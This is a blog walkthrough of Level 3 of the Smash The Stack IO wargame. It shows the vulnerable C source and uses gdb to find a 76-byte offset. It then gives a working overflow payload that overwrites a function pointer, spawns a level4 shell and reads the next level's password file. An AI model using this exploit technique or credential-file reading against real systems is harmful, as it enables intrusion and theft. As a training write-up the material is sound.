---
title: "Smash The Stack: IO Level 3 Walkthrough"
date: 2014-12-01T18:09:38+00:00
url: "/smash-the-stack-level3/"
draft: false
description: "A walkthrough of Level 3 on Smash The Stack IO, exploiting a stack buffer overflow with memcpy to overwrite a function pointer."
categories: ["exploit-dev", "Linux", "Security"]
tags: ["smashthestack", "wargame", "buffer-overflow", "function-pointer", "gdb"]
---

In Level 3 of the Smash The Stack IO wargame, passing a large argument quickly causes a segmentation fault:

```bash
level3@io:/levels$ ./level03 $(python -c "print 'A' * 1000")
Segmentation fault
```

### Analyzing the Source Code

The source file `level03.c` is provided in `/levels`:

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void good()
{
    puts("Win.");
    execl("/bin/sh", "sh", NULL);
}

void bad()
{
    printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
}

int main(int argc, char **argv, char **envp)
{
    void (*functionpointer)(void) = bad;
    char buffer[50];

    if (argc != 2 || strlen(argv[1]) < 4)
        return 0;

    memcpy(buffer, argv[1], strlen(argv[1]));
    memset(buffer, 0, strlen(argv[1]) - 4);

    printf("This is exciting we're going to %p\n", functionpointer);
    functionpointer();

    return 0;
}
```

### Vulnerability Analysis

1. **Target Function**: `good()` spawns a privileged shell via `execl("/bin/sh", ...)`.
2. **Buffer and Function Pointer**: `main()` allocates a 50-byte buffer (`char buffer[50]`) and initializes a function pointer pointing to `bad()`.
3. **Unbounded Copy**: `memcpy(buffer, argv[1], strlen(argv[1]))` copies the entire input into `buffer` without checking against its 50-byte bound.
4. **Partial Clear**: `memset(buffer, 0, strlen(argv[1]) - 4)` zeroes out `buffer` up to `strlen(argv[1]) - 4`. The last 4 bytes of our input remain untouched in memory.
5. **Execution**: The program invokes `functionpointer()`. If we overflow `buffer` such that the trailing 4 bytes align precisely over `functionpointer`, we redirect execution to `good()`.

### Finding Addresses and Offset in GDB

Disassemble and locate the address of `good()`:

```bash
level3@io:/levels$ gdb -q ./level03
(gdb) print good
$1 = {void (void)} 0x8048474 <good>
```

Address in little-endian format: `\x74\x84\x04\x08`.

Next, set a breakpoint after `memcpy` (`0x08048530`) to inspect stack layout:

```text
(gdb) b *0x08048530
(gdb) r $(python -c "print 'A' * 60")
(gdb) x/32wx $esp
```

Looking at memory relative to `buffer`:
- `buffer` starts at `-0x58(%ebp)`.
- `functionpointer` resides at `-0xc(%ebp)`.
- Difference: `0x58 - 0x0c = 0x4c = 76 bytes`.

76 bytes of padding are required before the 4-byte address overwrite.

### Exploitation

Craft the payload: `76 * 'A' + 0x08048474`:

```bash
level3@io:/levels$ ./level03 $(python -c "print 'A' * 76 + '\x74\x84\x04\x08'")
This is exciting we're going to 0x8048474
Win.
sh-4.2$ whoami
level4
sh-4.2$ cat /home/level4/.pass
```

The function pointer is hijacked, invoking `good()` and dropping into the `level4` shell.
